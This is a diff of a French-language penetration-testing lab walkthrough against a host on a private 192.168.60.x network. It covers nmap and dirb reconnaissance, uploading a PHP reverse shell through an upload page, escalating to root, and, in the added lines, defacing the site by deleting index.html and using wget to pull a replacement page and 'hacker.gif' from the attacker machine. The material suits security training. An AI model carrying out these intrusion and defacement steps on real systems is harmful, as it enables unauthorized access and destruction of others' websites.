@@ -4,15 +4,19 @@
 
 > nmap 192.168.60.0/24
 
-Visite du site web, on trouve que le serveur utilise php
+On trouve un serveur http sur le port 80 sur 192.168.60.10
+
+Visite du site web via le navigateur, on trouve notamment que le serveur utilise php
 
 > dirb http://192.168.60.10/
 
 > dirb http://192.168.60.10/ -X .php
 
+Avec dirb on a trouvé les pages /upload.php et /uploads
+
 ## Reverse shell
 
-Upload de shell.php dans /upload.php
+Upload de shell.php depuis /upload.php
 
 Attente du reverse shell depuis kali:
 
@@ -35,3 +39,25 @@ Utiliser python pour l'escalade:
 Vérifier qu'on est root:
 
 > whoami
+
+## Défiguration
+
+Depuis le reverse shell:
+
+> cd /var/www/html
+
+Vérifier qu'on est dans le bon dossier:
+
+> ls 
+
+Depuis un nouveau terminal kali, depuis le dossier server sur le bureau, lancher un serveur pour transférer les fichiers:
+
+> python -m SimpleHTTPServer
+
+Depuis le reverse shell, supprimer index.html, puis télécharger les fichiers nécessaires à afficher la nouvelle page d'accueil:
+
+> rm index.html
+
+> wget http://192.168.60.11:8000/index.html
+
+> wget http://192.168.60.11:8000/hacker.gif
